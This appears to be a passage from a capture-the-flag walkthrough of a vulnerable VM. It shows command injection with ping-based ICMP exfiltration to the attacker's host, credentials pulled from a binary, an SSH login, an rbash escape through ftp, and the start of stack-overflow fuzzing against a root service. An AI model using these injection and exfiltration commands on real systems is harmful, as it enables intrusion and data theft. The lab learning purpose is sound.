<p>So, only ping eh. I recall something about ping tunnels/ping shells/ping something. So, I googled some of these solutions. There were a number of things I could try, however, I was wondering how the actual data transport was happening for these things.</p>
<p>Eventually, I came across the <code>-p</code> argument for ping after reading <a href=http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html>this</a> blogpost. From <code>man 8 ping</code> we read:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>-p pattern
   You may specify up to <span style=color:#ae81ff>16</span> <span style=color:#e6db74>``</span>pad<span style=color:#e6db74>&#39;&#39;</span> bytes to fill out the packet you send.
   This is useful <span style=color:#66d9ef>for</span> diagnosing data-dependent problems in a network.
   For example, <span style=color:#e6db74>``</span>-p ff<span style=color:#e6db74>&#39;&#39;</span> will cause the sent packet to be filled with all ones.
</code></pre></div><p>So that changes things. I quickly confirmed that we have <code>xxd</code> available using my previous enumeration method and we did. Great.</p>
<p>I fired up tcpdump with the <code>-X</code> flag to show me the packet contents, and tested it out with the following payload for the <code>id</code> command:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>;id| xxd -p -c <span style=color:#ae81ff>16</span> | <span style=color:#66d9ef>while</span> read line; <span style=color:#66d9ef>do</span> ping -p $line -c <span style=color:#ae81ff>1</span> -q 192.168.56.102; <span style=color:#66d9ef>done</span>
</code></pre></div><p>On the <code>tcpdump</code> side of things&mldr;</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~/Desktop# tcpdump icmp -X
tcpdump: verbose output suppressed, use -v or -vv <span style=color:#66d9ef>for</span> full protocol decode
listening on eth0, link-type EN10MB <span style=color:#f92672>(</span>Ethernet<span style=color:#f92672>)</span>, capture size <span style=color:#ae81ff>65535</span> bytes
09:18:14.439222 IP 192.168.56.104 &gt; 192.168.56.102: ICMP echo request, id 6920, seq 1, length <span style=color:#ae81ff>64</span>
    0x0000:  <span style=color:#ae81ff>4500</span> <span style=color:#ae81ff>0054</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>4000</span> <span style=color:#ae81ff>4001</span> 488a c0a8 <span style=color:#ae81ff>3868</span>  E..T..@.@.H...8h
    0x0010:  c0a8 <span style=color:#ae81ff>3866</span> <span style=color:#ae81ff>0800</span> 4b5b 1b08 <span style=color:#ae81ff>0001</span> 56a3 1a54  ..8f..K<span style=color:#f92672>[</span>....V..T
    0x0020:  f357 0a00 6e67 696e <span style=color:#ae81ff>7829</span> <span style=color:#ae81ff>2067</span> <span style=color:#ae81ff>7569</span> 643d  .W..nginx<span style=color:#f92672>)</span>.guid<span style=color:#f92672>=</span>
    0x0030:  <span style=color:#ae81ff>3439</span> <span style=color:#ae81ff>3828</span> 6e67 696e <span style=color:#ae81ff>7829</span> <span style=color:#ae81ff>2067</span> <span style=color:#ae81ff>7569</span> 643d  498<span style=color:#f92672>(</span>nginx<span style=color:#f92672>)</span>.guid<span style=color:#f92672>=</span>
    0x0040:  <span style=color:#ae81ff>3439</span> <span style=color:#ae81ff>3828</span> 6e67 696e <span style=color:#ae81ff>7829</span> <span style=color:#ae81ff>2067</span> <span style=color:#ae81ff>7569</span> 643d  498<span style=color:#f92672>(</span>nginx<span style=color:#f92672>)</span>.guid<span style=color:#f92672>=</span>
    0x0050:  <span style=color:#ae81ff>3439</span> <span style=color:#ae81ff>3828</span>                                498<span style=color:#f92672>(</span>
09:18:14.439248 IP 192.168.56.102 &gt; 192.168.56.104: ICMP echo reply, id 6920, seq 1, length <span style=color:#ae81ff>64</span>
    0x0000:  <span style=color:#ae81ff>4500</span> <span style=color:#ae81ff>0054</span> a049 <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>4001</span> e840 c0a8 <span style=color:#ae81ff>3866</span>  E..T.I..@..@..8f
    0x0010:  c0a8 <span style=color:#ae81ff>3868</span> <span style=color:#ae81ff>0000</span> 535b 1b08 <span style=color:#ae81ff>0001</span> 56a3 1a54  ..8h..S<span style=color:#f92672>[</span>....V..T
    0x0020:  f357 0a00 6e67 696e <span style=color:#ae81ff>7829</span> <span style=color:#ae81ff>2067</span> <span style=color:#ae81ff>7569</span> 643d  .W..nginx<span style=color:#f92672>)</span>.guid<span style=color:#f92672>=</span>
    0x0030:  <span style=color:#ae81ff>3439</span> <span style=color:#ae81ff>3828</span> 6e67 696e <span style=color:#ae81ff>7829</span> <span style=color:#ae81ff>2067</span> <span style=color:#ae81ff>7569</span> 643d  498<span style=color:#f92672>(</span>nginx<span style=color:#f92672>)</span>.guid<span style=color:#f92672>=</span>
    0x0040:  <span style=color:#ae81ff>3439</span> <span style=color:#ae81ff>3828</span> 6e67 696e <span style=color:#ae81ff>7829</span> <span style=color:#ae81ff>2067</span> <span style=color:#ae81ff>7569</span> 643d  498<span style=color:#f92672>(</span>nginx<span style=color:#f92672>)</span>.guid<span style=color:#f92672>=</span>
    0x0050:  <span style=color:#ae81ff>3439</span> <span style=color:#ae81ff>3828</span>                                498<span style=color:#f92672>(</span>
09:18:14.440365 IP 192.168.56.104 &gt; 192.168.56.102: ICMP echo request, id 7176, seq 1, length <span style=color:#ae81ff>64</span>
    0x0000:  <span style=color:#ae81ff>4500</span> <span style=color:#ae81ff>0054</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>4000</span> <span style=color:#ae81ff>4001</span> 488a c0a8 <span style=color:#ae81ff>3868</span>  E..T..@.@.H...8h
    0x0010:  c0a8 <span style=color:#ae81ff>3866</span> <span style=color:#ae81ff>0800</span> 318a 1c08 <span style=color:#ae81ff>0001</span> 56a3 1a54  ..8f..1.....V..T
    0x0020:  e35a 0a00 <span style=color:#ae81ff>6769</span> 6e78 <span style=color:#ae81ff>2920</span> <span style=color:#ae81ff>6772</span> <span style=color:#ae81ff>6964</span> 3d34  .Z..ginx<span style=color:#f92672>)</span>.grid<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span>
    0x0030:  <span style=color:#ae81ff>3938</span> 286e <span style=color:#ae81ff>6769</span> 6e78 <span style=color:#ae81ff>2920</span> <span style=color:#ae81ff>6772</span> <span style=color:#ae81ff>6964</span> 3d34  98<span style=color:#f92672>(</span>nginx<span style=color:#f92672>)</span>.grid<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span>
    0x0040:  <span style=color:#ae81ff>3938</span> 286e <span style=color:#ae81ff>6769</span> 6e78 <span style=color:#ae81ff>2920</span> <span style=color:#ae81ff>6772</span> <span style=color:#ae81ff>6964</span> 3d34  98<span style=color:#f92672>(</span>nginx<span style=color:#f92672>)</span>.grid<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span>
    0x0050:  <span style=color:#ae81ff>3938</span> 286e                                98<span style=color:#f92672>(</span>n
09:18:14.440382 IP 192.168.56.102 &gt; 192.168.56.104: ICMP echo reply, id 7176, seq 1, length <span style=color:#ae81ff>64</span>
    0x0000:  <span style=color:#ae81ff>4500</span> <span style=color:#ae81ff>0054</span> a04a <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>4001</span> e83f c0a8 <span style=color:#ae81ff>3866</span>  E..T.J..@..?..8f
    0x0010:  c0a8 <span style=color:#ae81ff>3868</span> <span style=color:#ae81ff>0000</span> 398a 1c08 <span style=color:#ae81ff>0001</span> 56a3 1a54  ..8h..9.....V..T
    0x0020:  e35a 0a00 <span style=color:#ae81ff>6769</span> 6e78 <span style=color:#ae81ff>2920</span> <span style=color:#ae81ff>6772</span> <span style=color:#ae81ff>6964</span> 3d34  .Z..ginx<span style=color:#f92672>)</span>.grid<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span>
    0x0030:  <span style=color:#ae81ff>3938</span> 286e <span style=color:#ae81ff>6769</span> 6e78 <span style=color:#ae81ff>2920</span> <span style=color:#ae81ff>6772</span> <span style=color:#ae81ff>6964</span> 3d34  98<span style=color:#f92672>(</span>nginx<span style=color:#f92672>)</span>.grid<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span>
    0x0040:  <span style=color:#ae81ff>3938</span> 286e <span style=color:#ae81ff>6769</span> 6e78 <span style=color:#ae81ff>2920</span> <span style=color:#ae81ff>6772</span> <span style=color:#ae81ff>6964</span> 3d34  98<span style=color:#f92672>(</span>nginx<span style=color:#f92672>)</span>.grid<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span>
    0x0050:  <span style=color:#ae81ff>3938</span> 286e                                98<span style=color:#f92672>(</span>n
09:18:14.441191 IP 192.168.56.104 &gt; 192.168.56.102: ICMP echo request, id 7432, seq 1, length <span style=color:#ae81ff>64</span>
    0x0000:  <span style=color:#ae81ff>4500</span> <span style=color:#ae81ff>0054</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>4000</span> <span style=color:#ae81ff>4001</span> 488a c0a8 <span style=color:#ae81ff>3868</span>  E..T..@.@.H...8h
    0x0010:  c0a8 <span style=color:#ae81ff>3866</span> <span style=color:#ae81ff>0800</span> ed92 1d08 <span style=color:#ae81ff>0001</span> 56a3 1a54  ..8f........V..T
    0x0020:  f95d 0a00 286e <span style=color:#ae81ff>6769</span> 6e78 290a 6f75 <span style=color:#ae81ff>7073</span>  .<span style=color:#f92672>]</span>..<span style=color:#f92672>(</span>nginx<span style=color:#f92672>)</span>.oups
    0x0030:  3d34 <span style=color:#ae81ff>3938</span> 286e <span style=color:#ae81ff>6769</span> 6e78 290a 6f75 7073  <span style=color:#f92672>=</span>498<span style=color:#f92672>(</span>nginx<span style=color:#f92672>)</span>.oups
    0x0040:  3d34 <span style=color:#ae81ff>3938</span> 286e <span style=color:#ae81ff>6769</span> 6e78 290a 6f75 7073  <span style=color:#f92672>=</span>498<span style=color:#f92672>(</span>nginx<span style=color:#f92672>)</span>.oups
    0x0050:  3d34 3938                                <span style=color:#f92672>=</span><span style=color:#ae81ff>498</span>
09:18:14.441198 IP 192.168.56.102 &gt; 192.168.56.104: ICMP echo reply, id 7432, seq 1, length <span style=color:#ae81ff>64</span>
    0x0000:  <span style=color:#ae81ff>4500</span> <span style=color:#ae81ff>0054</span> a04b <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>4001</span> e83e c0a8 <span style=color:#ae81ff>3866</span>  E..T.K..@..&gt;..8f
    0x0010:  c0a8 <span style=color:#ae81ff>3868</span> <span style=color:#ae81ff>0000</span> f592 1d08 <span style=color:#ae81ff>0001</span> 56a3 1a54  ..8h........V..T
    0x0020:  f95d 0a00 286e <span style=color:#ae81ff>6769</span> 6e78 290a 6f75 <span style=color:#ae81ff>7073</span>  .<span style=color:#f92672>]</span>..<span style=color:#f92672>(</span>nginx<span style=color:#f92672>)</span>.oups
    0x0030:  3d34 <span style=color:#ae81ff>3938</span> 286e <span style=color:#ae81ff>6769</span> 6e78 290a 6f75 7073  <span style=color:#f92672>=</span>498<span style=color:#f92672>(</span>nginx<span style=color:#f92672>)</span>.oups
    0x0040:  3d34 <span style=color:#ae81ff>3938</span> 286e <span style=color:#ae81ff>6769</span> 6e78 290a 6f75 7073  <span style=color:#f92672>=</span>498<span style=color:#f92672>(</span>nginx<span style=color:#f92672>)</span>.oups
    0x0050:  3d34 3938                                <span style=color:#f92672>=</span><span style=color:#ae81ff>498</span>
</code></pre></div><p>Mind. Blown.</p>
<p>In case you don&rsquo;t see it, we have extracts of the <code>id</code> command in the request/response packets like <em>98(nginx).grid=4</em>. While this is not really fun to decipher, and with commands that produce a lot of output even worse, it was in fact <strong>something</strong> to work with!</p>
<p>I fiddled around with this for a little while longer, trying to make the output a little more readable. Eventually I fired up scapy and just printed the data section of the packet. Not much better, but with a little more effort I am sure you can get something very workable out of it.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>&gt;&gt;&gt;</span> sniff(filter<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;icmp[icmptype] == 8 and host 192.168.56.104&#34;</span>, prn<span style=color:#f92672>=</span><span style=color:#66d9ef>lambda</span> x: x<span style=color:#f92672>.</span>load)
ؤ<span style=color:#960050;background-color:#1e0010></span>T<span style=color:#960050;background-color:#1e0010>�</span>nginx) guid<span style=color:#f92672>=</span><span style=color:#ae81ff>498</span>(nginx) guid<span style=color:#f92672>=</span><span style=color:#ae81ff>498</span>(nginx) guid<span style=color:#f92672>=</span><span style=color:#ae81ff>498</span>(
ؤ<span style=color:#960050;background-color:#1e0010></span>T
   ginx) grid<span style=color:#f92672>=</span><span style=color:#ae81ff>498</span>(nginx) grid<span style=color:#f92672>=</span><span style=color:#ae81ff>498</span>(nginx) grid<span style=color:#f92672>=</span><span style=color:#ae81ff>498</span>(n
ؤ<span style=color:#960050;background-color:#1e0010></span>T<span style=color:#960050;background-color:#1e0010>�</span>(nginx)
oups<span style=color:#f92672>=</span><span style=color:#ae81ff>498</span>(nginx)
oups<span style=color:#f92672>=</span><span style=color:#ae81ff>498</span>(nginx)
oups<span style=color:#f92672>=</span><span style=color:#ae81ff>498</span>
</code></pre></div><h2 id=sysadmin-tool>sysadmin-tool<a hidden class=anchor aria-hidden=true href=#sysadmin-tool>#</a></h2>
<p>So with actual output to work with, I can almost say I have shell, however, it&rsquo;s crap. Here I had many options to go for. Do I try and get one of those ping tunnels up to shell with? Or something else.</p>
<p>At one stage I ran <code>ls</code> as the command trying to see if there was anything in the web path that I may not have found yet. A file called <em>sysadmin-tool</em> was revealed. I browsed to the file which pushed it as a download for me, and saved it locally. I then ran the bin through <code>strings</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# strings sysadmin-tool
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
chroot
strncmp
puts
setreuid
mkdir
rmdir
chdir
system
__libc_start_main
GLIBC_2.0
PTRh
<span style=color:#f92672>[</span>^_<span style=color:#f92672>]</span>
Usage: sysadmin-tool --activate-service
--activate-service
breakout
/bin/sed -i <span style=color:#e6db74>&#39;s/^#//&#39;</span> /etc/sysconfig/iptables
/sbin/iptables-restore &lt; /etc/sysconfig/iptables
Service started...
Use avida:dollars to access.
/nginx/usr/share/nginx/html/breakout
</code></pre></div><p>From this alone we can deduce that when run, it may modify the firewall. It also looks like it contains some credentials, so I took note of those too. I then tried to run the command, followed by a nmap scan:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>;./sysadmin-tool --activate-service| xxd -p -c <span style=color:#ae81ff>16</span> | <span style=color:#66d9ef>while</span> read line; <span style=color:#66d9ef>do</span> ping -p $line -c <span style=color:#ae81ff>1</span> -q 192.168.56.102; <span style=color:#66d9ef>done</span>
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# nmap 192.168.56.104 --reason -sV -p-

Starting Nmap 6.46 <span style=color:#f92672>(</span> http://nmap.org <span style=color:#f92672>)</span> at 2014-09-18 09:46 SAST
Nmap scan report <span style=color:#66d9ef>for</span> 192.168.56.104
Host is up, received reset <span style=color:#f92672>(</span>0.0017s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>65533</span> filtered ports
Reason: <span style=color:#ae81ff>65533</span> no-responses
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 5.3 <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
80/tcp open  http    syn-ack nginx 1.4.7

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 6637.05 seconds
</code></pre></div><p>Yay! SSH.</p>
<h2 id=shell-and-breakout-as-avida>shell and breakout as avida<a hidden class=anchor aria-hidden=true href=#shell-and-breakout-as-avida>#</a></h2>
<p>Using the information that looked like credentials retrieved in the previous section, I proceeded to SSH into the server:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~/Desktop/persistence# ssh avida@192.168.56.104
The authenticity of host <span style=color:#e6db74>&#39;192.168.56.104 (192.168.56.104)&#39;</span> can<span style=color:#e6db74>&#39;t be established.
</span><span style=color:#e6db74>RSA key fingerprint is 37:22:da:ba:ef:05:1f:77:6a:30:6f:61:56:7b:47:54.
</span><span style=color:#e6db74>Are you sure you want to continue connecting (yes/no)? yes
</span><span style=color:#e6db74>Warning: Permanently added &#39;</span>192.168.56.104<span style=color:#e6db74>&#39; (RSA) to the list of known hosts.
</span><span style=color:#e6db74>avida@192.168.56.104&#39;</span>s password:    <span style=color:#75715e># dollars</span>
Last login: Thu Sep <span style=color:#ae81ff>18</span> 05:57:30 <span style=color:#ae81ff>2014</span>
-rbash-4.1$
</code></pre></div><p>Op success. Or is it? I immediately noticed the prompt as <code>rbash</code>, aka restricted bash. :( Having a look around, I was in fact very limited to what I can do. Most annoyingly, I was unable to run commands with a <code>/</code> in them.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>-rbash-4.1$ /bin/bash
-rbash: /bin/bash: restricted: cannot specify <span style=color:#e6db74>`</span>/<span style=color:#960050;background-color:#1e0010>&#39;</span> in command names
</code></pre></div><p>So the next logical step was to attempt &lsquo;breaking out&rsquo; of this shell so that I can have a better look around. I was able to cat say <code>/etc/passwd</code>, but that only gets you <em>that</em> far :P</p>
<p>After quite some time and some research, it became apparent that the well known breakouts from rbash are not possible. I was unable to edit my PATH, change files and re-login or use the classic <code>vi</code> <code>:shell</code> breakout. Eventually (and out of desperation), I focussed my attention to <code>ftp</code>. Opening <code>ftp</code>, and typing <code>help</code> at the prompt, I studied each available command carefully. In the list was a exclamation mark(!), which I typed and pressed enter:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>-rbash-4.1$ ftp
ftp&gt; !
+rbash-4.1$ /bin/bash
bash-4.1$
</code></pre></div><p>I got dropped into another <code>rbash</code> shell, however this time with a +. So, I went for <code>/bin/bash</code> and&mldr; w00t? I exported a new PATH to my environment, and all of those annoying rbash restrictions were gone. Thank goodness!</p>
<h2 id=the-wopr-game>the wopr game<a hidden class=anchor aria-hidden=true href=#the-wopr-game>#</a></h2>
<p>During the enumeration done while still stuck with <code>rbash</code>, I noticed that the machine was listening for connections on tcp/3333 locally when inspecting the output of <code>netstat</code>. Opening a telnet session to this port presented you with a &lsquo;game&rsquo;:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>bash-4.1$ telnet 127.0.0.1 <span style=color:#ae81ff>3333</span>
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is <span style=color:#e6db74>&#39;^]&#39;</span>.
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> hello, my name is sploitable
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> would you like to play a game?
&gt; yes!
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> yeah, I don<span style=color:#960050;background-color:#1e0010>&#39;</span>t think so
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> bye!
Connection closed by foreign host.
bash-4.1$
</code></pre></div><p>I asked really, really nicely, but no matter how polite I was, it would just not let me play!</p>
<p>Further inspection showed that the game was possibly run as root from <code>/usr/local/bin/wopr</code></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>bash-4.1$ ps -ef | grep wopr
root      <span style=color:#ae81ff>1005</span>     <span style=color:#ae81ff>1</span>  <span style=color:#ae81ff>0</span> 05:42 ?        00:00:00 /usr/local/bin/wopr
root      <span style=color:#ae81ff>1577</span>  <span style=color:#ae81ff>1005</span>  <span style=color:#ae81ff>0</span> 06:43 ?        00:00:00 <span style=color:#f92672>[</span>wopr<span style=color:#f92672>]</span> &lt;defunct&gt;
avida     <span style=color:#ae81ff>1609</span>  <span style=color:#ae81ff>1501</span>  <span style=color:#ae81ff>0</span> 06:47 pts/0    00:00:00 grep wopr

bash-4.1$ ls -lah /usr/local/bin/wopr
-rwxr-xr-x. <span style=color:#ae81ff>1</span> root root 7.7K Apr <span style=color:#ae81ff>28</span> 07:43 /usr/local/bin/wopr
</code></pre></div><p><code>wopr</code> was also readable to me which was great news! I decided to get a copy of the binary onto my local Kali Linux box, and take a closer look at the internals:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># first, hex encode the file</span>
bash-4.1$ xxd -p -c <span style=color:#ae81ff>36</span> /usr/local/bin/wopr
7f454c460101010000000000000000000200030001000000c08604083400000080110000
0000000034002000090028001e001b000600000034000000348004083480040820010000
<span style=color:#f92672>[</span>... snip ...<span style=color:#f92672>]</span>
38362e6765745f70635f7468756e6b2e6278006d61696e005f696e697400
bash-4.1$

<span style=color:#75715e># next, I copied the xxd output from the persistence terminal</span>
<span style=color:#75715e># and pasted it into a file called wopr.xxd. Then reverted it</span>
<span style=color:#75715e># and redirected the output to `wopr`</span>
root@kali:~# cat wopr.xxd | xxd -r -p &gt; wopr
</code></pre></div><p>The idea was to see if there may be a way to exploit this program so that I can execute some commands using it. It is running as root after all&mldr;</p>
<h2 id=wopr-stack-smashing>wopr, stack smashing<a hidden class=anchor aria-hidden=true href=#wopr-stack-smashing>#</a></h2>
<p>Poking around the binary, I mostly used <code>gdb</code> along with <a href=https://github.com/longld/peda>peda</a>.
Checksec revealed that this binary was compiled with quite a few security features built in.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# gdb -q ./wopr
Reading symbols from persistence/wopr...<span style=color:#f92672>(</span>no debugging symbols found<span style=color:#f92672>)</span>...done.
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
</code></pre></div><p>Digesting the above output should bring us to a few conclusions. A stack canary is present, meaning if we corrupt memory, and dont have a correct canary, the binary may terminate itself as a protection mechanism once it detects the incorrect canary. Secondly, the binary is compiled to mark the stack as non executable. Any potential shellcode that we write here will not be executed. Lastly, the GOT relocation is set to read only, meaning function locations are resolved at the beginning of execution and the GOT is then marked as read only resulting in the inability to rewrite plt type lookups.</p>
<p>With all of that in mind, I ran the binary with the <code>r</code> command, and made a new telnet session to it.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>gdb-peda$ r
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> bind complete
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> waiting <span style=color:#66d9ef>for</span> connections
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> logging queries to $TMPLOG
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> got a connection
<span style=color:#f92672>[</span>New process 26936<span style=color:#f92672>]</span>
<span style=color:#f92672>[</span>Inferior <span style=color:#ae81ff>2</span> <span style=color:#f92672>(</span>process 26936<span style=color:#f92672>)</span> exited normally<span style=color:#f92672>]</span>
Warning: not running or target is remote
gdb-peda$
</code></pre></div><p>When the new connection came in, a notice of a new process appears. Disassembling the main function gives us an indication that the process is doing a <code>fork()</code></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>gdb-peda$ disass main
Dump of assembler code <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>function</span> main:
    <span style=color:#f92672>[</span>.. snip ..<span style=color:#f92672>]</span>
   0x080489fd &lt;+543&gt;:   mov    DWORD PTR <span style=color:#f92672>[</span>esp<span style=color:#f92672>]</span>,0x8048cb2
   0x08048a04 &lt;+550&gt;:   call   0x804866c &lt;puts@plt&gt;
   0x08048a09 &lt;+555&gt;:   call   0x804867c &lt;fork@plt&gt; <span style=color:#75715e># &lt;--</span>
   0x08048a0e &lt;+560&gt;:   test   eax,eax
   0x08048a10 &lt;+562&gt;:   jne    0x8048b0e &lt;main+816&gt;
   0x08048a16 &lt;+568&gt;:   mov    DWORD PTR <span style=color:#f92672>[</span>esp+0x8<span style=color:#f92672>]</span>,0x21
   0x08048a1e &lt;+576&gt;:   mov    DWORD PTR <span style=color:#f92672>[</span>esp+0x4<span style=color:#f92672>]</span>,0x8048cc8
   0x08048a26 &lt;+584&gt;:   mov    eax,DWORD PTR <span style=color:#f92672>[</span>ebp-0x22c<span style=color:#f92672>]</span>
   0x08048a2c &lt;+590&gt;:   mov    DWORD PTR <span style=color:#f92672>[</span>esp<span style=color:#f92672>]</span>,eax
   0x08048a2f &lt;+593&gt;:   call   0x804858c &lt;write@plt&gt;
    <span style=color:#f92672>[</span>.. snip ..<span style=color:#f92672>]</span>
End of assembler dump.
gdb-peda$
</code></pre></div><p>Why is the <code>fork()</code> so important!? We will see in a bit just hang on. :)</p>
<p>So back to fuzzing wopr, I proceeded to send some arbtritary input via the telnet session. I noticed once I had sent more than 30 characters as input, wopr would freak out! This is a good freak out btw :D</p>
<p>Sending 30 x A&rsquo;s results in:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>gdb-peda$ <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> got a connection
*** stack smashing detected ***: wopr terminated
<span style=color:#f92672>=======</span> Backtrace: <span style=color:#f92672>=========</span>
/lib/i386-linux-gnu/libc.so.6<span style=color:#f92672>(</span>__fortify_fail+0x40<span style=color:#f92672>)[</span>0xb7f5ebb0<span style=color:#f92672>]</span>
/lib/i386-linux-gnu/libc.so.6<span style=color:#f92672>(</span>+0xeab6a<span style=color:#f92672>)[</span>0xb7f5eb6a<span style=color:#f92672>]</span>
wopr<span style=color:#f92672>[</span>0x80487dc<span style=color:#f92672>]</span>
wopr<span style=color:#f92672>[</span>0x8048ad6<span style=color:#f92672>]</span>
/lib/i386-linux-gnu/libc.so.6<span style=color:#f92672>(</span>__libc_start_main+0xe6<span style=color:#f92672>)[</span>0xb7e8ae36<span style=color:#f92672>]</span>
wopr<span style=color:#f92672>[</span>0x80486e1<span style=color:#f92672>]</span>
<span style=color:#f92672>=======</span> Memory map: <span style=color:#f92672>========</span>
08048000-08049000 r-xp <span style=color:#ae81ff>00000000</span> 08:01 <span style=color:#ae81ff>1184792</span>    wopr
08049000-0804a000 r--p <span style=color:#ae81ff>00000000</span> 08:01 <span style=color:#ae81ff>1184792</span>    wopr
0804a000-0804b000 rw-p <span style=color:#ae81ff>00001000</span> 08:01 <span style=color:#ae81ff>1184792</span>    wopr
0804b000-0806c000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>          <span style=color:#f92672>[</span>heap<span style=color:#f92672>]</span>
b7e3b000-b7e57000 r-xp <span style=color:#ae81ff>00000000</span> 08:01 <span style=color:#ae81ff>1573598</span>    /lib/i386-linux-gnu/libgcc_s.so.1
b7e57000-b7e58000 rw-p 0001b000 08:01 <span style=color:#ae81ff>1573598</span>    /lib/i386-linux-gnu/libgcc_s.so.1
b7e73000-b7e74000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>
b7e74000-b7fbd000 r-xp <span style=color:#ae81ff>00000000</span> 08:01 <span style=color:#ae81ff>1580474</span>    /lib/i386-linux-gnu/libc-2.13.so
b7fbd000-b7fbe000 ---p <span style=color:#ae81ff>00149000</span> 08:01 <span style=color:#ae81ff>1580474</span>    /lib/i386-linux-gnu/libc-2.13.so
b7fbe000-b7fc0000 r--p <span style=color:#ae81ff>00149000</span> 08:01 <span style=color:#ae81ff>1580474</span>    /lib/i386-linux-gnu/libc-2.13.so
b7fc0000-b7fc1000 rw-p 0014b000 08:01 <span style=color:#ae81ff>1580474</span>    /lib/i386-linux-gnu/libc-2.13.so
b7fc1000-b7fc4000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>
b7fde000-b7fe1000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>
b7fe1000-b7fe2000 r-xp <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>          <span style=color:#f92672>[</span>vdso<span style=color:#f92672>]</span>
b7fe2000-b7ffe000 r-xp <span style=color:#ae81ff>00000000</span> 08:01 <span style=color:#ae81ff>1579852</span>    /lib/i386-linux-gnu/ld-2.13.so
b7ffe000-b7fff000 r--p 0001b000 08:01 <span style=color:#ae81ff>1579852</span>    /lib/i386-linux-gnu/ld-2.13.so
